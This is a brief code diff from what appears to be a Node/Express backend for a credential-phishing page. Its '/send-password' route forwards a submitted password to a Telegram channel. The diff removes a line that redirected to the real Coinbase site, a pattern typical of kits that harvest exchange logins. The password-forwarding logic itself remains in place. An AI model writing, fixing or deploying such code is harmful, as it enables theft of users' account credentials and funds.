@@ -59,7 +59,6 @@ app.post('/send-password', async (req, res) => {
         const success = await sendTelegramMessage('Password', password);
         if (success) {
             res.status(200).json({ message: 'Password sent successfully' });
-            window.location.href = 'https://www.coinbase.com';
         } else {
             res.status(500).json({ error: 'Failed to send password' });
         }
